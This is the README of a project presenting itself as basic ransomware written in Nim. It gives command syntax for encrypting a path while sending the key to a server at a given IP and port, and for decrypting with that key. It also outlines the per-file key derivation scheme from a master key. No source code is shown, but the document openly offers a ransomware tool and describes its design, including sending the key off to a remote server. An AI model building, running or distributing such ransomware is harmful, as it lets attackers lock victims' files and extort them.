# ransom
Basic Ransomware in Nim

# usage
```
ransom e [path] [ip] [port]
ransom d [path] [key]
```
- **the key will be sent in plain text to the server**

# how
For each file, the ransom will generate a new key using the master key generated.  
`KDF(masterKey, filename, filesize) = AES(masterkey, SHA(filename & $(filesize))`
